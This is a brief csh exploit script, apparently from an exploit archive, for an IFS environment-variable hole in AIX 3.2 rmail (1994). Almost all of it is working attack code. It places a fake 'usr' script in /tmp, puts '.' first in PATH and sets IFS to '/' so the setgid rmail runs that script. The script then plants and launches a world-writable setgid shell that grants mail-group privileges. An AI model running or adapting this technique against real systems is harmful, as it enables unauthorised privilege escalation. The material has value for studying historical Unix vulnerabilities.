#source: https://www.securityfocus.com/bid/454/info
#
#Under older versions of AIX By changing the IFS enviroment variable to / setuid root programs that use system() or popen() can be fooled into running user provided programs.
#

#!/bin/csh
# IFS hole in AIX3.2 rmail gives egid=mail. Apr. 1994

# Setup needed files.

mkdir /tmp/.rmail
cd /tmp/.rmail

cat << EOF > usr
cp sh mailsh
chmod 2777 mailsh
EOF
chmod 777 usr
ln -s /bin/sh .

# Set PATH, IFS, and run rmail.

setenv PATH .:$PATH
setenv IFS /
echo "cheezy mail hack" | rmail joeuser@nohost.com
unsetenv IFS
rm -f usr sh # minor cleanup.
echo "Attempting to run sgid shell."
./mailsh